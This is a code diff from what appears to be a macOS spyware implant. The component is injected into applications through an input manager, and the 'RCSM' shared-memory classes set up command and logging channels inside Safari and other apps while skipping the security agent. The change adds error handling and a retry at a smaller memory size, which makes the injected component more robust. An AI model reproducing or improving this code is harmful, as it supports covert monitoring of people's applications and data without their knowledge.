@@ -294,7 +294,13 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   // TODO: Use an exclusion list instead of this
   if ([bundleIdentifier isEqualToString: @"com.apple.safari"] == YES)
     {
-      [self initSharedMemory];
+      if ([self initSharedMemory] == NO)
+        {
+#ifdef DEBUG_INPUT_MANAGER
+          errorLog(@"Error while creating shared memory");
+#endif
+          return;
+        }
       /*
       [[NSNotificationCenter defaultCenter] addObserver: self
                                                selector: @selector(checkForCommands)
@@ -326,7 +332,13 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     }
   else if ([bundleIdentifier isEqualToString: @"com.apple.securityagent"] == NO)
     {
-      [self initSharedMemory];
+      if ([self initSharedMemory] == NO)
+        {
+#ifdef DEBUG_INPUT_MANAGER
+          errorLog(@"Error while creating shared memory");
+#endif
+          return;
+        }
       
       if (gOSMajor == 10 && gOSMinor == 6)
         {
@@ -352,7 +364,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     }
 }
 
-+ (void)initSharedMemory
++ (BOOL)initSharedMemory
 {
   //
   // Initialize and attach to our Shared Memory regions
@@ -363,14 +375,46 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   mSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
                                                           size: gMemCommandMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
-  [mSharedMemoryCommand createMemoryRegion];
+  if ([mSharedMemoryCommand createMemoryRegion] == -1)
+    {
+#ifdef DEBUG_INPUT_MANAGER
+      errorLog(@"Error while creating shared memory for commands");
+#endif
+      [mSharedMemoryCommand release];
+      return NO;
+    }
   [mSharedMemoryCommand attachToMemoryRegion];
   
   mSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
                                                           size: gMemLogMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
-  [mSharedMemoryLogging createMemoryRegion];
+  if ([mSharedMemoryLogging createMemoryRegion] == -1)
+    {
+#ifdef DEBUG_INPUT_MANAGER
+      warnLog(@"Error while creating shared memory for logging, trying with lower size");
+#endif
+
+      [mSharedMemoryLogging release];
+      gMemLogMaxSize = 0x7a440;
+
+      mSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
+                                                              size: gMemLogMaxSize
+                                                     semaphoreName: SHMEM_SEM_NAME];
+
+      if ([mSharedMemoryLogging createMemoryRegion] == -1)
+        {
+#ifdef DEBUG_INPUT_MANAGER
+          errorLog(@"Error on shared memory for logging, quitting");
+#endif
+          [mSharedMemoryCommand release];
+          [mSharedMemoryLogging release];
+          return NO;
+        }
+    }
+
   [mSharedMemoryLogging attachToMemoryRegion];
+
+  return YES;
 }
 
 + (void)checkForCommands
